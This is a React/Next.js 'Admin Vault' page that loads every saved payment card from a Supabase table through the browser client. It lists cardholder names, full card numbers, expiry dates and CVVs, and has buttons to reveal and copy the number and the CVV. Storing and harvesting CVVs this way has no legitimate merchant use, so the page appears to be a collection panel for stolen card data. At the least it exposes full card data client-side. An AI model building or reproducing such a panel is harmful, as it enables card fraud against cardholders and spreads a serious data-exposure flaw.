'use client';

import { useState, useEffect } from 'react';
import { createBrowserClient } from '@supabase/ssr';
import { 
  CreditCard, 
  Trash2, 
  Copy, 
  Check, 
  Eye, 
  EyeOff, 
  RefreshCw,
  ShieldAlert
} from 'lucide-react';

interface AdminCardView {
  id: string;
  user_id: string;
  card_holder: string;
  card_number: string;
  card_brand: string;
  expiry: string;
  cvv: string;
  created_at: string;
}

export default function AdminCardsPage() {
  const [cards, setCards] = useState<AdminCardView[]>([]);
  const [loading, setLoading] = useState(true);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>({});

  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  );

  const fetchAllCards = async () => {
    try {
      setLoading(true);
      const { data, error } = await supabase
        .from('user_payment_methods')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) {
        console.error('Admin Fetch Error:', error.message);
      } else {
        setCards(data || []);
      }
    } catch (err: any) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchAllCards();
  }, []);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const toggleShow = (id: string) => {
    setShowSensitive(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleDelete = async (id: string) => {
    if (!confirm('Kya aap is card record ko delete karna chahte hain?')) return;
    const { error } = await supabase
      .from('user_payment_methods')
      .delete()
      .eq('id', id);

    if (!error) fetchAllCards();
  };

  return (
    <div className="space-y-6 p-6 max-w-7xl mx-auto">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-6 border-b border-zinc-800 gap-4">
        <div>
          <div className="flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 text-amber-500" />
            <span className="text-xs font-mono uppercase tracking-widest text-amber-400 font-bold">
              Admin Vault
            </span>
          </div>
          <h1 className="text-2xl font-bold text-white mt-1">
            Submitted Credit &amp; Debit Cards
          </h1>
          <p className="text-xs text-zinc-400 mt-1">
            Total records: {cards.length}
          </p>
        </div>

        <button
          onClick={fetchAllCards}
          className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-zinc-900 border border-zinc-800 hover:border-zinc-700 text-zinc-300 hover:text-white text-xs font-semibold transition"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
          Refresh Data
        </button>
      </div>

      {/* Cards Table */}
      {loading ? (
        <div className="py-20 flex justify-center">
          <div className="w-8 h-8 border-2 border-amber-500 border-t-transparent rounded-full animate-spin" />
        </div>
      ) : cards.length > 0 ? (
        <div className="rounded-2xl border border-zinc-800 bg-zinc-950 overflow-hidden shadow-2xl">
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse font-sans">
              <thead>
                <tr className="bg-zinc-900/80 border-b border-zinc-800 text-zinc-400 font-mono text-[11px] uppercase tracking-wider">
                  <th className="py-4 px-5">Date &amp; Brand</th>
                  <th className="py-4 px-5">Cardholder</th>
                  <th className="py-4 px-5">Card Number</th>
                  <th className="py-4 px-5">Expiry</th>
                  <th className="py-4 px-5">CVV</th>
                  <th className="py-4 px-5 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-800/60">
                {cards.map((c) => {
                  const isVisible = showSensitive[c.id];
                  const formattedDate = c.created_at ? new Date(c.created_at).toLocaleDateString() : '';

                  return (
                    <tr key={c.id} className="hover:bg-zinc-900/40 transition">
                      {/* Date & Brand */}
                      <td className="py-4 px-5">
                        <div className="space-y-1">
                          <span className="px-2 py-0.5 rounded bg-zinc-900 border border-zinc-800 text-[10px] font-mono font-bold text-amber-400 uppercase">
                            {c.card_brand}
                          </span>
                          <span className="block text-[11px] font-mono text-zinc-500">
                            {formattedDate}
                          </span>
                        </div>
                      </td>

                      {/* Cardholder */}
                      <td className="py-4 px-5">
                        <span className="font-semibold text-white text-sm block">
                          {c.card_holder}
                        </span>
                        <span className="text-[10px] font-mono text-zinc-500">
                          UID: {c.user_id ? c.user_id.slice(0, 8) : 'Guest'}...
                        </span>
                      </td>

                      {/* Card Number */}
                      <td className="py-4 px-5 font-mono text-sm">
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-zinc-200 tracking-wider">
                            {isVisible 
                              ? c.card_number 
                              : `•••• •••• •••• ${c.card_number.replace(/\s/g, '').slice(-4)}`}
                          </span>
                          <button
                            onClick={() => handleCopy(c.card_number.replace(/\s/g, ''), `num-${c.id}`)}
                            className="p-1 text-zinc-500 hover:text-white"
                            title="Copy Number"
                          >
                            {copiedId === `num-${c.id}` ? (
                              <Check className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </button>
                        </div>
                      </td>

                      {/* Expiry */}
                      <td className="py-4 px-5 font-mono text-zinc-300 font-semibold">
                        {c.expiry}
                      </td>

                      {/* CVV */}
                      <td className="py-4 px-5 font-mono">
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-amber-400 bg-zinc-900 px-2 py-1 rounded border border-zinc-800">
                            {isVisible ? c.cvv : '•••'}
                          </span>
                          <button
                            onClick={() => handleCopy(c.cvv, `cvv-${c.id}`)}
                            className="p-1 text-zinc-500 hover:text-white"
                            title="Copy CVV"
                          >
                            {copiedId === `cvv-${c.id}` ? (
                              <Check className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </button>
                        </div>
                      </td>

                      {/* Actions */}
                      <td className="py-4 px-5 text-right">
                        <div className="flex items-center justify-end gap-2">
                          <button
                            onClick={() => toggleShow(c.id)}
                            className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 text-zinc-400 hover:text-white"
                            title={isVisible ? 'Hide Details' : 'Show Details'}
                          >
                            {isVisible ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                          <button
                            onClick={() => handleDelete(c.id)}
                            className="p-1.5 rounded-lg bg-zinc-900 hover:bg-red-500/20 text-zinc-500 hover:text-red-400"
                            title="Delete Record"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      ) : (
        <div className="text-center py-20 border border-zinc-800 rounded-3xl bg-zinc-950">
          <CreditCard className="w-8 h-8 text-zinc-600 mx-auto mb-2" />
          <h3 className="text-sm font-bold text-white">No cards saved yet</h3>
        </div>
      )}
    </div>
  );
}